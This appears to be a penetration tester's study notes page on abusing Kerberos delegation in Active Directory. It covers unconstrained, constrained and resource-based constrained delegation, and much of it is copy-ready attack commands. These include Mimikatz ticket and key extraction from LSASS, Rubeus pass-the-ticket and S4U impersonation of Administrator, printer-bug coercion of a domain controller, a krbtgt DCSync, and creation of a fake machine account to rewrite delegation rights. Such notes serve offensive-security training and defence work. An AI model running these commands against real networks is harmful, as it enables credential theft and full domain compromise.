# Delegations

[#kerberos-double-hop-problem](../../misc/theory/concepts.md#kerberos-double-hop-problem "mention")

Kerberos delegation allows services to impersonate the user in order to communicate with another service and perform actions on behalf the user.

The TGT's are stored in the LSASS of the machine, so the idea of this attack is, if a machine has unconstrained delegation access to it, then it should have few TGS encapsulated with other user's TGT's who interacted with it earlier. There are chances that a Domain Admin TGT can also be found here. We can also coerce other systems into connecting to this unconstrained machine, so the unconstrained delegated machine will receive the ticket of this other system and store it in it's LSASS which we can extract later.

So that's why we first enumerate the unconstrained delegated computers then coerce (using printer bug) any high privs system (like DC) into connecting to this unconstrained delegated machine and then extract the tickets from the unconstrained delegated machine.

**How Kerberos works during delegation?** - [#kerberos-delegation](../../misc/theory/concepts.md#kerberos-delegation "mention")

## Unconstrained Delegation

Unconstrained Delegation allowing any service to use a user TGT in order to communicate with the **any** other service.

The TGT will be stored in the LSASS process.

Started from Windows server 2003

### Enumerate

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainComputer -UnConstrained
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
{% endtab %}
{% endtabs %}

### Exploitation

It is possible to extract the TGTs from the service's LSASS process using `Mimikatz` and perform pass the ticket.

{% code overflow="wrap" %}
```powershell
# Extract the TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Pass the ticket
Invoke-Mimikatz -Command '"kerberos::ptt TGT.kirbi"' 
Rubeus.exe ptt /ticket:"base64 | file.kirbi" # Rubues allows base64 format as alternative
```
{% endcode %}

### Printer bug

The printer bug uses an RPC call of MS-RPRN which allows any domain user can force/coerce any machine that running the Spooler service to connect to a second machine of the domain user's choice.

<figure><img src="https://remnote-user-data.s3.amazonaws.com/uQrKxz7B1DU5EjfDjH0fTfIGRnch8Yd1p7P6o93XEEZgALItDnhhOzAK3vVnquuP0kdiH9GbE4r3zTk-WJOd7vnHti_8WrFddpbPUQhQM6T6YVqvBpB8Yhdjf13IFoh7.png" alt=""><figcaption></figcaption></figure>

1. Run on compromised Server Rubeus monitor i.e, mostly the unconstrained delegation machine

```powershell
# Will receive the base64 ticket in a while after coercing in the next step
Rubeus.exe monitor /interval:5 /nowrap
```

2. Run on compromised Domain User the RPC Call using [SpoolSample](https://github.com/leechristensen/SpoolSample) \ [Coercer](https://github.com/p0dalirius/Coercer)

```powershell
MS-RPRN.exe \\dc.machine.local \\compromised.machine.local
```

3. Pass The Ticket

```
Rubeus.exe ptt /ticket:<base64_encoded_value_of_the_ticket>
```

3. DC Sync

```
SafetyKatz.exe "lsadump::dcsync /user:dcrop\krbtgt" "exit" 
```

## Constrained Delegation

Constrained Delegation allowing **specified** services on **specified** computers to use a user TGT in order to communicate with the **any** other service.

in order to create a more restrictive delegation mechanism, Microsoft develop two Kerberos extensions known as Service for user (S4U):

* Service for User to Self (S4U2self) - allows a service to obtain forwardable TGS to itself on behalf of user.
* Service for User to Proxy (S4U2proxy) - allows a service to obtain a TGS to another service on behalf of user.\
  Note that the other services are from white list controlled by `msDS-AllowedToDelegateTo` attribute.

### Enumerate

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
{% endtab %}
{% endtabs %}

### Exploitation

{% code overflow="wrap" %}
```powershell
Rubeus.exe s4u /user:websvc /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt

# You can change the target service in the ticket
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
{% endcode %}

Check if worked

```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
```

## Resource Based Delegation

Instead of the white list of SPNs controlled by `msDS-AllowedToDelegateTo` attribute, resource based controlled by the `msDS-AllowedToActOnBehalfOfOtherIdentity`

To abuse RBCD we need Write permissions over the target machine `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

### Enumerate

```powershell
# Check if allowed to create machines
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select ms-ds-machineaccountquota

# Check Write premissions to modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute on target machine
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

# Check if RBCD is set using PowerView - This can be used to verify also
Get-DomainRBCD  
```

### Exploitation

#### Create fake machine

```powershell
# Using Powermad
import-module powermad
New-MachineAccount -MachineAccount dcorp-student483 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

#### Change security descriptor

<pre class="language-powershell"><code class="lang-powershell">$TargetComputer = 'dcorp-mgmt'
$FakeComputer = 'dcorp-student483'

# Using PowerView
$ComputerSid = Get-DomainComputer $FakeComputer -Properties objectsid | Select -Expand objectsid
<strong>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
</strong>$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# One liner using PowerView
Set-DomainRBCD -Identity $TargetComputer -DelegateFrom $FakeComputer -Verbose   
# Using AD Module
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $FakeComputer 

# Verify
Get-DomainComputer dcorp-mgmt -Properties 'msds-allowedtoactonbehalfofotheridentity'
# Verify Result
msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}

# Verify using ADModule
Get-ADComputer dcorp-mgmt -Properties PrincipalsAllowedToDelegateToAccount
</code></pre>

#### Abuse using Rubeus

```powershell
## Get the fake machine hash
Rubeus.exe hash /password:123456 /user:dcorp-student483 /domain:dollarcorp.moneycorp.local
## If used AD Module need to extract the hash from lsass using mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Imporsnate
Rubeus.exe s4u /user:dcorp-student483$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:http/dcorp-mgmt /ptt

# Verify (winrs on this case)
winrs -r:dcorp-mgmt cmd
```
